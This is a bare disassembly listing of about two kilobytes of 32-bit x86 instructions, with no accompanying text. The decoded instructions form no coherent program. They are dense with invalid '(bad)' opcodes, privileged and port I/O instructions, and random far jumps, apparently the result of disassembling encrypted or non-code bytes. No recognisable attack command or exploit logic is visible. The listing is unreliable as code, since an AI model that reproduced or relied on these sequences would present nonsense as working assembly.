  40f57f:	and    ah,0x9f
  40f582:	pop    ebx
  40f583:	and    dh,cl
  40f585:	imul   edx,DWORD PTR [ebx-0x4f],0xffffffcd
  40f589:	xor    cl,BYTE PTR [ebp+esi*4-0x7d101e1d]
  40f590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f591:	pop    ebx
  40f592:	lea    esp,[ebx]
  40f594:	inc    ebp
  40f595:	xchg   ecx,eax
  40f596:	stos   DWORD PTR es:[edi],eax
  40f597:	dec    esp
  40f598:	call   0x4922:0x56a6d091
  40f59f:	fwait
  40f5a0:	mov    edi,ebx
  40f5a2:	jns    0x40f560
  40f5a4:	sub    BYTE PTR [esi-0x3232e7bf],0x77
  40f5ab:	push   ebp
  40f5ac:	jge    0x40f562
  40f5ae:	mov    DWORD PTR [eax+0x1be9f765],edx
  40f5b4:	test   dl,bh
  40f5b6:	sub    DWORD PTR [esi+edx*8+0x66],ecx
  40f5ba:	dec    edi
  40f5bb:	dec    edi
  40f5bc:	adc    DWORD PTR [ebx],esi
  40f5be:	jge    0x40f5e4
  40f5c0:	xor    DWORD PTR [ecx],edx
  40f5c2:	dec    edi
  40f5c3:	cmp    al,0x21
  40f5c5:	inc    eax
  40f5c6:	pop    eax
  40f5c7:	or     al,bh
  40f5c9:	clc    
  40f5ca:	sbb    eax,0xa0c47f75
  40f5cf:	sbb    eax,ebx
  40f5d1:	jg     0x40f584
  40f5d3:	int3   
  40f5d4:	das    
  40f5d5:	(bad)  
  40f5d6:	add    edx,DWORD PTR [ebx+ebp*8+0x27]
  40f5da:	int    0xb6
  40f5dc:	ja     0x40f5c4
  40f5de:	int3   
  40f5df:	fdiv   QWORD PTR ds:0x44ce41c9
  40f5e5:	aas    
  40f5e6:	sub    eax,0x855a3ce
  40f5eb:	and    DWORD PTR fs:[ebx+0x57d768a7],0xb044b8e3
  40f5f6:	sbb    bh,BYTE PTR [edi-0x10]
  40f5f9:	push   ebp
  40f5fa:	rcl    BYTE PTR [ebp+0x184a749f],1
  40f600:	shl    DWORD PTR [ebp+0x697134b9],cl
  40f606:	pop    esi
  40f607:	out    dx,eax
  40f608:	fcompp 
  40f60a:	out    dx,al
  40f60b:	leave  
  40f60c:	leave  
  40f60d:	cmp    ebp,DWORD PTR [ecx+esi*2-0x6fd8e482]
  40f614:	dec    ebp
  40f615:	lods   al,BYTE PTR ds:[esi]
  40f616:	adc    eax,0xcdf5abaf
  40f61b:	jmp    0x40f681
  40f61d:	mov    DWORD PTR [esi-0x6384663e],eax
  40f623:	mov    cl,0x1
  40f625:	xor    ecx,DWORD PTR [edx+edi*8+0x107fef8]
  40f62c:	out    dx,al
  40f62d:	mov    DWORD PTR [edx+0x53],ebx
  40f630:	in     eax,dx
  40f631:	add    eax,0xb71f741f
  40f636:	div    DWORD PTR [edi]
  40f638:	imul   ebp,DWORD PTR [ebp+0x55],0xffffffdf
  40f63c:	mov    BYTE PTR [esp+esi*8],0x80
  40f640:	sbb    DWORD PTR [esi+edx*4],eax
  40f643:	jne    0x40f664
  40f645:	mov    cs,WORD PTR [esi+eax*1]
  40f648:	shl    DWORD PTR [ebx+0x1a8f5aee],cl
  40f64e:	jmp    0x5299:0xdf9def2e
  40f655:	add    DWORD PTR [edx-0x5873f60f],esi
  40f65b:	ins    BYTE PTR es:[edi],dx
  40f65c:	dec    ebx
  40f65d:	sub    ch,dh
  40f65f:	aaa    
  40f660:	push   esp
  40f661:	(bad)  
  40f663:	outs   dx,DWORD PTR ds:[esi]
  40f664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f665:	adc    eax,0xdd80fea
  40f66a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66b:	inc    ebp
  40f66c:	int3   
  40f66d:	push   esp
  40f66e:	repz jle 0x40f6e1
  40f671:	out    dx,al
  40f672:	lods   eax,DWORD PTR ds:[esi]
  40f673:	push   ebx
  40f674:	add    DWORD PTR [esi],esi
  40f676:	lock stos BYTE PTR es:[edi],al
  40f678:	and    eax,0xe2833da8
  40f67d:	fistp  DWORD PTR [ebx-0x4e]
  40f680:	jg     0x40f637
  40f682:	lahf   
  40f683:	retf   0x5c37
  40f686:	imul   eax
  40f688:	sbb    eax,0x15568696
  40f68d:	xor    ah,cl
  40f68f:	dec    eax
  40f690:	pop    eax
  40f691:	push   edi
  40f692:	jnp    0x40f6aa
  40f694:	shl    ah,0xc7
  40f697:	or     al,0x66
  40f699:	nop
  40f69a:	fld    DWORD PTR [eax+0x29]
  40f69d:	mov    BYTE PTR [ebx-0x27b1c6c6],bh
  40f6a3:	aas    
  40f6a4:	sub    dh,BYTE PTR [esi]
  40f6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6a7:	dec    BYTE PTR [edi+0x72aa2fd6]
  40f6ad:	test   BYTE PTR [ebx+eiz*1-0x1],dl
  40f6b1:	aaa    
  40f6b2:	dec    esi
  40f6b3:	(bad)  
  40f6b4:	jns    0x40f6df
  40f6b6:	sbb    eax,0x26077fd7
  40f6bb:	jge    0x40f713
  40f6bd:	aas    
  40f6be:	cwde   
  40f6bf:	addr16 sub eax,0xbda45e95
  40f6c5:	ret    0xf911
  40f6c8:	sub    BYTE PTR [ebp+0x4],cl
  40f6cb:	in     al,0xc5
  40f6cd:	pop    es
  40f6ce:	add    eax,DWORD PTR [eax+0x4f]
  40f6d1:	rep outs dx,BYTE PTR ds:[esi]
  40f6d3:	push   ebx
  40f6d4:	mov    dl,0x9e
  40f6d6:	sub    ebp,ecx
  40f6d8:	push   es
  40f6d9:	std    
  40f6da:	aad    0x8f
  40f6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6dd:	push   edx
  40f6de:	and    eax,0x6f4c3dfd
  40f6e3:	jge    0x40f68e
  40f6e5:	push   cs
  40f6e6:	rcr    BYTE PTR [esi+eax*8+0x61],cl
  40f6ea:	pop    edx
  40f6eb:	cmp    dh,ch
  40f6ed:	dec    ebp
  40f6ee:	add    al,0x5d
  40f6f0:	cmp    DWORD PTR [eax+0xb],esi
  40f6f3:	or     ah,BYTE PTR ds:0xedfe376f
  40f6f9:	jne    0x40f736
  40f6fb:	outs   dx,DWORD PTR ds:[esi]
  40f6fc:	sub    al,BYTE PTR [ebx]
  40f6fe:	icebp  
  40f6ff:	jl     0x40f6cd
  40f701:	ds int 0x5a
  40f704:	and    bl,BYTE PTR [ebx-0x62c0cd98]
  40f70a:	add    eax,0xf95ff2d2
  40f70f:	fild   WORD PTR [ebp-0x7a]
  40f712:	cwde   
  40f713:	and    DWORD PTR [esi-0x6286c35],edi
  40f719:	pusha  
  40f71a:	retf   0xe310
  40f71d:	stos   BYTE PTR es:[edi],al
  40f71e:	lea    ebp,[edx+esi*8+0x6a694991]
  40f725:	test   DWORD PTR [ebx+eiz*1],edi
  40f728:	mov    ds,ecx
  40f72a:	icebp  
  40f72b:	dec    edi
  40f72c:	iret   
  40f72d:	ret    0xe32e
  40f730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f731:	popf   
  40f732:	outs   dx,BYTE PTR ds:[esi]
  40f733:	fwait
  40f734:	leave  
  40f735:	mov    al,0xc9
  40f737:	mov    edi,0xaa5472b3
  40f73c:	jne    0x40f790
  40f73e:	out    0xc3,al
  40f740:	outs   dx,BYTE PTR ds:[esi]
  40f741:	xchg   BYTE PTR [eax-0x54],al
  40f744:	cs out 0x4e,al
  40f747:	xor    BYTE PTR [ecx],0x28
  40f74a:	sti    
  40f74b:	push   eax
  40f74c:	jecxz  0x40f6de
  40f74e:	loop   0x40f6ee
  40f750:	add    eax,0x4b827bb0
  40f755:	inc    eax
  40f756:	add    al,BYTE PTR [ebx+0x5b]
  40f759:	jl     0x40f766
  40f75b:	mov    eax,0x954d8654
  40f760:	repnz mov cl,BYTE PTR cs:[ecx+0x6ef448dd]
  40f768:	dec    edi
  40f769:	out    0xb3,al
  40f76b:	push   ss
  40f76c:	lock es nop
  40f76f:	scas   al,BYTE PTR es:[edi]
  40f770:	dec    edx
  40f771:	jo     0x40f751
  40f773:	enter  0xf250,0xf6
  40f777:	dec    eax
  40f778:	and    al,0x9e
  40f77a:	dec    edi
  40f77b:	cwde   
  40f77c:	mov    bh,0xf9
  40f77e:	aas    
  40f77f:	pusha  
  40f780:	je     0x40f73a
  40f782:	xor    al,0x68
  40f784:	push   ebx
  40f785:	mov    ebp,0xd75bb46a
  40f78a:	(bad)  
  40f78b:	push   ds
  40f78c:	aas    
  40f78d:	shl    DWORD PTR [ebp+0x4c285cd2],1
  40f793:	pop    DWORD PTR [ecx]
  40f795:	xchg   edx,eax
  40f796:	push   0x40cf87d8
  40f79b:	loope  0x40f817
  40f79d:	dec    ebp
  40f79e:	dec    edi
  40f79f:	popf   
  40f7a0:	pusha  
  40f7a1:	lock ret 
  40f7a3:	mov    ebp,0xb65e0ee0
  40f7a8:	push   ss
  40f7a9:	sub    al,0x63
  40f7ab:	cmp    eax,0x3c522bce
  40f7b0:	push   0xe00be2d0
  40f7b5:	imul   esp,esi,0x61
  40f7b8:	mov    ds:0x3148e745,eax
  40f7bd:	stos   BYTE PTR es:[edi],al
  40f7be:	lods   eax,DWORD PTR ds:[esi]
  40f7bf:	ins    BYTE PTR es:[edi],dx
  40f7c0:	adc    bl,bl
  40f7c2:	dec    ebx
  40f7c3:	call   0x6d293d95
  40f7c8:	cwde   
  40f7c9:	sbb    BYTE PTR [ecx-0x24],dh
  40f7cc:	jo     0x40f7cd
  40f7ce:	add    dl,cl
  40f7d0:	frstor es:[esi]
  40f7d3:	sbb    al,0xa1
  40f7d5:	push   ss
  40f7d6:	outs   dx,DWORD PTR ds:[esi]
  40f7d7:	arpl   WORD PTR [ebx],bx
  40f7d9:	adc    eax,0xd49cc979
  40f7de:	test   eax,0x2a64bd65
  40f7e3:	lahf   
  40f7e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7e5:	ret    0xed2c
  40f7e8:	pushf  
  40f7e9:	(bad)  
  40f7ea:	aad    0x8f
  40f7ec:	icebp  
  40f7ed:	adc    ebp,ebx
  40f7ef:	push   ebp
  40f7f0:	pop    ds
  40f7f1:	fild   DWORD PTR [eax]
  40f7f3:	in     al,dx
  40f7f4:	add    edx,DWORD PTR [eax]
  40f7f6:	fisub  DWORD PTR [ebx-0x2]
  40f7f9:	test   DWORD PTR [ebp+0x1a],0x329aeebf
  40f800:	test   BYTE PTR [eax+0x2c212c6e],ch
  40f806:	mov    edi,0xc01184bc
  40f80b:	mov    DWORD PTR [eax+0x4f741580],eax
  40f811:	xchg   DWORD PTR [edi+0x1e4bc2bd],edi
  40f817:	xor    edx,0xffffffcc
  40f81a:	mov    dh,0x71
  40f81c:	jbe    0x40f895
  40f81e:	in     eax,dx
  40f81f:	jecxz  0x40f87c
  40f821:	sbb    dl,BYTE PTR [eax+0x2092a34f]
  40f827:	jl     0x40f83a
  40f829:	(bad)  
  40f82a:	mov    cl,0x1
  40f82c:	es aas 
  40f82e:	mov    eax,0xb05c1386
  40f833:	dec    esi
  40f834:	or     ebp,eax
  40f836:	xlat   BYTE PTR ds:[ebx]
  40f837:	or     al,0xdc
  40f839:	inc    edx
  40f83a:	in     al,dx
  40f83b:	adc    al,0x43
  40f83d:	pop    ds
  40f83e:	sbb    DWORD PTR [ecx+0x11],0x66
  40f842:	sbb    BYTE PTR [ebp+0x21],al
  40f845:	jmp    0x40f7f8
  40f847:	daa    
  40f848:	or     esi,edx
  40f84a:	aas    
  40f84b:	adc    esi,DWORD PTR [eax]
  40f84d:	popa   
  40f84e:	loop   0x40f872
  40f850:	dec    ecx
  40f851:	or     dh,al
  40f853:	mov    bl,bh
  40f855:	loopne 0x40f893
  40f857:	cli    
  40f858:	cli    
  40f859:	mov    BYTE PTR [edx],dl
  40f85b:	icebp  
  40f85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f85d:	and    eax,0x114cbeec
  40f862:	(bad)  
  40f863:	fs push eax
  40f865:	das    
  40f866:	imul   esi,DWORD PTR [eax+0xc],0xebbe8ac1
  40f86d:	stos   BYTE PTR es:[edi],al
  40f86e:	jecxz  0x40f873
  40f870:	jge    0x40f8e6
  40f872:	shl    BYTE PTR [esi+edx*4+0x14],1
  40f876:	xor    esi,ecx
  40f878:	and    al,0xee
  40f87a:	dec    eax
  40f87b:	xor    dl,cl
  40f87d:	pop    ss
  40f87e:	loope  0x40f834
  40f880:	push   0xffffff82
  40f882:	jg     0x40f8cb
  40f884:	push   esp
  40f885:	pusha  
  40f886:	setns  BYTE PTR [edx-0x3c96566a]
  40f88d:	sub    bl,bl
  40f88f:	push   edi
  40f890:	and    edx,0xffffffac
  40f893:	jge    0x40f8bd
  40f895:	pop    ebp
  40f896:	push   ds
  40f897:	mov    gs,eax
  40f899:	inc    edx
  40f89a:	test   bh,ah
  40f89c:	push   eax
  40f89d:	ins    DWORD PTR es:[edi],dx
  40f89e:	add    DWORD PTR [ebp+0xbd7dcd9],eax
  40f8a4:	repz loop 0x40f862
  40f8a7:	dec    ecx
  40f8a8:	push   edx
  40f8a9:	fild   QWORD PTR ds:0x5200d4e0
  40f8af:	pop    edi
  40f8b0:	mov    al,ds:0x67fee828
  40f8b5:	xchg   ecx,eax
  40f8b6:	test   eax,0xd47ffeba
  40f8bb:	and    eax,0x142cc421
  40f8c0:	and    ebx,ebp
  40f8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c3:	mov    bl,0xb1
  40f8c5:	ins    BYTE PTR es:[edi],dx
  40f8c6:	out    dx,al
  40f8c7:	in     eax,0xe5
  40f8c9:	pop    esp
  40f8ca:	ds mov al,0x66
  40f8cd:	out    dx,al
  40f8ce:	ja     0x40f902
  40f8d0:	loopne 0x40f88b
  40f8d2:	jmp    0x40f89a
  40f8d4:	sbb    al,0xf
  40f8d6:	stc    
  40f8d7:	xchg   ecx,eax
  40f8d8:	cvtpi2ps xmm5,QWORD PTR [ebp-0x3b]
  40f8dc:	int    0x79
  40f8de:	cmp    DWORD PTR [ecx-0xcb9a4f0],esp
  40f8e4:	mov    al,ds:0xa357a65c
  40f8e9:	and    dl,BYTE PTR [ebx]
  40f8eb:	cmp    DWORD PTR [edi-0x61],esp
  40f8ee:	jnp    0x40f885
  40f8f0:	adc    BYTE PTR [edx-0x20],bh
  40f8f3:	inc    esp
  40f8f4:	cs ins BYTE PTR es:[edi],dx
  40f8f6:	add    DWORD PTR [edx],eax
  40f8f8:	comiss xmm5,DWORD PTR [ebp+edi*1+0x615f6293]
  40f900:	pop    eax
  40f901:	pop    ebp
  40f902:	pop    es
  40f903:	mov    al,0xbf
  40f905:	or     ebx,DWORD PTR [edx+0x40f2968a]
  40f90b:	mov    ch,0xbc
  40f90d:	sub    ah,ch
  40f90f:	mov    ah,0x2c
  40f911:	sub    eax,0xbc5eadbd
  40f916:	fbld   TBYTE PTR [esi]
  40f918:	imul   esi,DWORD PTR [ecx-0x70],0x7445e4ad
  40f91f:	sub    ecx,esp
  40f921:	mov    esp,0x31778cc4
  40f926:	in     al,dx
  40f927:	xor    ch,BYTE PTR [esi+ebx*1+0x76ebe182]
  40f92e:	scas   eax,DWORD PTR es:[edi]
  40f92f:	pop    ebp
  40f930:	loopne 0x40f9a1
  40f932:	pop    esp
  40f933:	mov    ah,0x4c
  40f935:	inc    esi
  40f936:	add    eax,0xdbe4199b
  40f93b:	xchg   esp,eax
  40f93c:	xor    esi,DWORD PTR ds:0x2c93f5eb
  40f942:	jmp    0x40f8ca
  40f944:	jne    0x40f9a2
  40f946:	pop    es
  40f947:	jecxz  0x40f957
  40f949:	adc    eax,0xff8e5dc2
  40f94e:	dec    ebx
  40f94f:	std    
  40f950:	ss push ebp
  40f952:	xor    eax,0x776187a3
  40f957:	pop    ss
  40f958:	push   esp
  40f959:	xchg   ecx,eax
  40f95a:	ret    
  40f95b:	mov    edx,0x5b4506cb
  40f960:	push   cs
  40f961:	inc    ecx
  40f962:	add    eax,0x77faa612
  40f967:	stos   BYTE PTR es:[edi],al
  40f968:	adc    DWORD PTR [esi+0x5de0b26b],ecx
  40f96e:	adc    DWORD PTR [edx-0x43],ebx
  40f971:	jmp    0x13cb:0x40adcaad
  40f978:	jne    0x40f8fc
  40f97a:	popf   
  40f97b:	jmp    0x40f9c8
  40f97d:	and    BYTE PTR [eax-0x75fad244],dl
  40f983:	jo     0x40f9fc
  40f985:	and    DWORD PTR [edx-0x749052e0],ebx
  40f98b:	dec    ecx
  40f98c:	sbb    eax,DWORD PTR [esi+0x12a20ae9]
  40f992:	dec    esi
  40f993:	add    eax,0xd05230ff
  40f998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f999:	icebp  
  40f99a:	mov    ecx,0x1e9a9355
  40f99f:	fst    QWORD PTR [edi]
  40f9a1:	mov    ch,0xc9
  40f9a3:	enter  0x1c5a,0xdd
  40f9a7:	inc    edi
  40f9a8:	repz xlat BYTE PTR gs:[ebx]
  40f9ab:	in     al,dx
  40f9ac:	adc    ebp,eax
  40f9ae:	jl     0x40fa13
  40f9b0:	or     eax,0xed7f797a
  40f9b5:	lods   eax,DWORD PTR ds:[esi]
  40f9b6:	fld    DWORD PTR [esi+0x56]
  40f9b9:	stos   DWORD PTR es:[edi],eax
  40f9ba:	ret    
  40f9bb:	daa    
  40f9bc:	jae    0x40f98d
  40f9be:	test   BYTE PTR [ebp-0x4c],dl
  40f9c1:	popa   
  40f9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9c3:	clc    
  40f9c4:	fimul  WORD PTR [edx+0x6a4fab27]
  40f9ca:	xor    DWORD PTR [edx+0x65],esi
  40f9cd:	xchg   esp,eax
  40f9ce:	jg     0x40f9bb
  40f9d0:	popf   
  40f9d1:	sbb    al,0xee
  40f9d3:	div    DWORD PTR [edx-0x8]
  40f9d6:	push   0x791f7bdc
  40f9db:	mov    al,BYTE PTR [eax-0x20]
  40f9de:	out    dx,eax
  40f9df:	mov    BYTE PTR [eax],bh
  40f9e1:	aam    0x6f
  40f9e3:	pop    esi
  40f9e4:	and    DWORD PTR [eax+esi*1-0x366139b5],0xb305fb8a
  40f9ef:	push   ebx
  40f9f0:	mov    DWORD PTR [ebx],0x65ec48fb
  40f9f6:	inc    esp
  40f9f7:	xchg   esp,eax
  40f9f8:	push   ebp
  40f9f9:	mov    eax,ds:0x9343d907
  40f9fe:	jg     0x40fa78
  40fa00:	and    eax,0x79f63c7a
  40fa05:	cdq    
  40fa06:	fcomp  QWORD PTR [bx+di]
  40fa09:	push   cs
  40fa0a:	jl     0x40fa4d
  40fa0c:	jno    0x40f9ab
  40fa0e:	sbb    edi,DWORD PTR [ecx-0x579b0369]
  40fa14:	imul   ebx,DWORD PTR [ebx],0x4f
  40fa17:	std    
  40fa18:	mov    ds:0xa4281c13,eax
  40fa1d:	mov    edx,0xa541b931
  40fa22:	inc    esp
  40fa23:	cmp    cl,al
  40fa25:	mov    bh,0x96
  40fa27:	mov    edx,0x9bb73fd2
  40fa2c:	dec    eax
  40fa2d:	in     al,dx
  40fa2e:	push   ds
  40fa2f:	mov    eax,ds:0x428da692
  40fa34:	scas   al,BYTE PTR es:[edi]
  40fa35:	(bad)  
  40fa36:	(bad)  
  40fa37:	push   0x1449a093
  40fa3c:	sbb    BYTE PTR [edi+0x3c54d034],al
  40fa42:	push   esi
  40fa43:	int    0x7a
  40fa45:	push   es
  40fa46:	cmp    eax,0xdf68cc92
  40fa4b:	cmp    edi,DWORD PTR [edi-0x310691a6]
  40fa51:	adc    BYTE PTR [ebx],0x56
  40fa54:	iret   
  40fa55:	cmc    
  40fa56:	mov    ah,0x43
  40fa58:	test   al,0x11
  40fa5a:	in     eax,dx
  40fa5b:	ja     0x40faa6
  40fa5d:	add    BYTE PTR [ebx-0x67],0xb1
  40fa61:	test   eax,0x8d3bc85c
  40fa66:	jl     0x40fa9d
  40fa68:	add    eax,0x8d33f26e
  40fa6d:	repz xchg ebp,eax
  40fa6f:	inc    ebp
  40fa70:	loope  0x40facd
  40fa72:	adc    DWORD PTR [bx+di-0x2486],edi
  40fa77:	xchg   edi,esp
  40fa79:	dec    ebp
  40fa7a:	int3   
  40fa7b:	lds    eax,FWORD PTR [ecx+ebx*2-0x73440389]
  40fa82:	mov    BYTE PTR [edx-0x5f719b81],ah
  40fa88:	xchg   esp,eax
  40fa89:	or     eax,0xe90f8271
  40fa8e:	sbb    esp,eax
  40fa90:	xor    DWORD PTR [ebp*8-0x68a319ce],ecx
  40fa97:	adc    eax,0x1b65dbab
  40fa9c:	lods   eax,DWORD PTR ds:[esi]
  40fa9d:	repz cmp al,BYTE PTR [ebx+0x7c]
  40faa1:	fwait
  40faa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faa3:	paddsb mm4,QWORD PTR [eax-0x31]
  40faa7:	lahf   
  40faa8:	jp     0x40fa6b
  40faaa:	mov    dh,0x68
  40faac:	scas   eax,DWORD PTR es:[edi]
  40faad:	ins    DWORD PTR es:[edi],dx
  40faae:	test   al,0x17
  40fab0:	fcom   DWORD PTR [edx+0x75a30443]
  40fab6:	out    dx,eax
  40fab7:	test   esp,edx
  40fab9:	add    DWORD PTR [ecx],eax
  40fabb:	(bad)  
  40fabc:	push   ebp
  40fabd:	jbe    0x40fa4b
  40fabf:	mov    al,ds:0xfb8b28bb
  40fac4:	jge    0x40fa92
  40fac6:	pop    eax
  40fac7:	call   0xe4a8:0x5efe9830
  40face:	push   DWORD PTR [ebp-0x68]
  40fad1:	mov    esp,0xa069d328
  40fad6:	js     0x40fad2
  40fad8:	mov    dh,0x8e
  40fada:	push   ebx
  40fadb:	or     cl,BYTE PTR [ebx+0x26c77e8]
  40fae1:	cld    
  40fae2:	ror    BYTE PTR [esi-0x50048261],0x13
  40fae9:	mov    edx,0xe0361ba7
  40faee:	mov    ds:0xa92b8b30,al
  40faf3:	ret    
  40faf4:	adc    ecx,esi
  40faf6:	xchg   DWORD PTR ds:0x4a3d66ee,edx
  40fafc:	add    al,0x9a
  40fafe:	in     al,dx
  40faff:	dec    esi
  40fb00:	lahf   
  40fb01:	ficomp WORD PTR [edi-0x5c67f90b]
  40fb07:	icebp  
  40fb08:	mov    dl,0xb9
  40fb0a:	mov    esp,0x7c18e043
  40fb0f:	xchg   ebp,eax
  40fb10:	addr16 dec ebx
  40fb12:	or     ch,BYTE PTR [ebp+0x7]
  40fb15:	push   cs
  40fb16:	or     eax,0xd823413f
  40fb1b:	dec    esi
  40fb1c:	mov    ebx,0xbb7a6f0
  40fb21:	xchg   ecx,eax
  40fb22:	sti    
  40fb23:	clc    
  40fb24:	push   cs
  40fb25:	imul   ebp,DWORD PTR [ebp-0x1afa7e41]
  40fb2c:	push   ds
  40fb2d:	mov    ecx,0x410f911b
  40fb32:	loop   0x40faf0
  40fb34:	inc    ebp
  40fb35:	mov    esi,ebx
  40fb37:	add    eax,0x4a967a86
  40fb3c:	lahf   
  40fb3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb3e:	rcl    BYTE PTR ds:0x7810ab46,cl
  40fb44:	jge    0x40faf4
  40fb46:	add    DWORD PTR [ebp-0x79818381],ecx
  40fb4c:	inc    ebp
  40fb4d:	xchg   esi,eax
  40fb4e:	jmp    0xe0d55ffa
  40fb53:	push   eax
  40fb54:	es inc esi
  40fb56:	mov    bl,0x32
  40fb58:	jecxz  0x40fb8b
  40fb5a:	add    dh,BYTE PTR [ecx+0x738d1f5b]
  40fb60:	sub    ecx,DWORD PTR [edi-0x2c]
  40fb63:	adc    DWORD PTR [edi+0x7b],esp
  40fb66:	add    dh,BYTE PTR [esi]
  40fb68:	mov    dl,0xfd
  40fb6a:	fnsave [eax+0xbc0d5b2]
  40fb70:	xchg   edx,eax
  40fb71:	push   edx
  40fb72:	inc    edx
  40fb73:	jmp    0xc294:0x458ef7e2
  40fb7a:	lods   al,BYTE PTR ds:[esi]
  40fb7b:	inc    ebx
  40fb7c:	mov    eax,0xbcf18b1b
  40fb81:	adc    ecx,ebp
  40fb83:	jl     0x40fb56
  40fb85:	wrmsr  
  40fb87:	push   edx
  40fb88:	js     0x40fb59
  40fb8a:	out    0xe3,al
  40fb8c:	xor    DWORD PTR [esi+0x5e57c28],ecx
  40fb92:	mov    bh,0xbd
  40fb94:	pushf  
  40fb95:	push   ecx
  40fb96:	xchg   esi,esi
  40fb98:	pusha  
  40fb99:	dec    esp
  40fb9a:	xchg   edx,eax
  40fb9b:	iret   
  40fb9c:	inc    esp
  40fb9d:	inc    ebx
  40fb9e:	dec    ecx
  40fb9f:	out    0x13,eax
  40fba1:	clc    
  40fba2:	arpl   WORD PTR [ecx-0x60c5f4f1],ax
  40fba8:	arpl   WORD PTR [edx-0x7f49b9e3],sp
  40fbae:	sbb    al,0xa
  40fbb0:	lock outs dx,BYTE PTR ds:[esi]
  40fbb2:	sbb    eax,0x7694a109
  40fbb7:	push   edi
  40fbb8:	inc    edx
  40fbb9:	(bad)
  40fbbd:	loope  0x40fbe1
  40fbbf:	push   esi
  40fbc0:	scas   eax,DWORD PTR es:[edi]
  40fbc1:	das    
  40fbc2:	dec    edx
  40fbc3:	pop    ebx
  40fbc4:	inc    BYTE PTR es:[edi]
  40fbc7:	neg    DWORD PTR [ecx+0x4e454d26]
  40fbcd:	nop
  40fbce:	sub    eax,0xd6e86c3c
  40fbd3:	enter  0x8d43,0x28
  40fbd7:	sbb    bh,dl
  40fbd9:	jg     0x40fb6b
  40fbdb:	push   0xd4838038
  40fbe0:	test   al,0x3c
  40fbe2:	cmp    al,0x73
  40fbe4:	jp     0x40fbe6
  40fbe6:	cmc    
  40fbe7:	jbe    0x40fb6e
  40fbe9:	sub    eax,ebx
  40fbeb:	pushf  
  40fbec:	cmp    dh,BYTE PTR [edx]
  40fbee:	loope  0x40fc6d
  40fbf0:	gs sbb bl,0x80
  40fbf4:	push   es
  40fbf5:	xchg   edi,eax
  40fbf6:	mov    cl,dl
  40fbf8:	adc    eax,0x3a47df2e
  40fbfd:	ja     0x40fc4e
  40fbff:	int3   
  40fc00:	cmp    edi,esi
  40fc02:	and    esi,DWORD PTR [eax-0x57]
  40fc05:	ja     0x40fbb3
  40fc07:	fcom   st(2)
  40fc09:	pushf  
  40fc0a:	pop    ss
  40fc0b:	push   es
  40fc0c:	es bound ecx,QWORD PTR fs:[edi]
  40fc10:	xchg   ebp,eax
  40fc11:	fist   DWORD PTR [ebp-0x28]
  40fc14:	sbb    al,0xe6
  40fc16:	pop    ss
  40fc17:	int3   
  40fc18:	repz cmp DWORD PTR [eax-0x6b],edx
  40fc1c:	jbe    0x40fc60
  40fc1e:	jmp    0x40fbac
  40fc20:	es adc edi,esp
  40fc23:	xor    edx,0xffffffca
  40fc26:	iret   
  40fc27:	mov    edx,0xdefdfcee
  40fc2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2d:	adc    BYTE PTR [edx+0x6b0805ae],dl
  40fc33:	out    dx,eax
  40fc34:	cli    
  40fc35:	inc    ebp
  40fc36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc37:	ror    DWORD PTR [ecx+0x2778a68c],cl
  40fc3d:	popa   
  40fc3e:	outs   dx,DWORD PTR ds:[esi]
  40fc3f:	repz lahf 
  40fc41:	imul   BYTE PTR [esp+esi*1+0x6f]
  40fc45:	loopne 0x40fbf1
  40fc47:	(bad)  
  40fc48:	imul   DWORD PTR [ebx+edi*2]
  40fc4b:	push   ebx
  40fc4c:	mov    edi,0x1d72ab5b
  40fc51:	pop    esi
  40fc52:	scas   al,BYTE PTR es:[edi]
  40fc53:	mov    al,0x38
  40fc55:	push   esi
  40fc56:	add    esi,DWORD PTR [edx+0x5aedc804]
  40fc5c:	push   cs
  40fc5d:	mov    ebx,0x1e4b97d8
  40fc62:	ds add bh,ch
  40fc65:	ss push ebp
  40fc67:	sub    DWORD PTR [ebx],esi
  40fc69:	aas    
  40fc6a:	out    dx,eax
  40fc6b:	xchg   edi,eax
  40fc6c:	mov    bh,0x2e
  40fc6e:	dec    edx
  40fc6f:	jb     0x40fc0c
  40fc71:	inc    esp
  40fc72:	xchg   ebp,eax
  40fc73:	fild   WORD PTR [esp+ecx*8+0x22]
  40fc77:	dec    esi
  40fc78:	pop    ebp
  40fc79:	fucomip st,st(6)
  40fc7b:	(bad)  
  40fc7c:	xchg   ebx,eax
  40fc7d:	sahf   
  40fc7e:	or     esi,esp
  40fc80:	jno    0x40fcde
  40fc82:	imul   eax,edi,0x51
  40fc85:	push   ecx
  40fc86:	mov    bl,0xde
  40fc88:	bnd jbe 0x40fcec
  40fc8b:	mov    eax,ds:0x3854c9a
  40fc90:	sbb    cl,ch
  40fc92:	xor    eax,0xc768a339
  40fc97:	sub    eax,0x8472d92b
  40fc9c:	mov    BYTE PTR [esi-0x26],al
  40fc9f:	push   ebx
  40fca0:	add    DWORD PTR [edx-0x41],ecx
  40fca3:	ret    
  40fca4:	xor    edx,DWORD PTR [edi]
  40fca6:	shl    BYTE PTR [ebp+0xb1a8427],0xcd
  40fcad:	mov    ds:0x34fa6149,al
  40fcb2:	rcr    edx,1
  40fcb4:	sar    DWORD PTR [ebx],1
  40fcb6:	sub    esi,DWORD PTR [edx]
  40fcb8:	pop    ecx
  40fcb9:	into   
  40fcba:	jecxz  0x40fca3
  40fcbc:	mov    dl,0x33
  40fcbe:	jno    0x40fd06
  40fcc0:	inc    ecx
  40fcc1:	sub    DWORD PTR [edx+0x19],eax
  40fcc4:	sub    DWORD PTR [ecx+0x50f84484],esi
  40fcca:	inc    esp
  40fccb:	and    ecx,esp
  40fccd:	add    DWORD PTR [edx],ecx
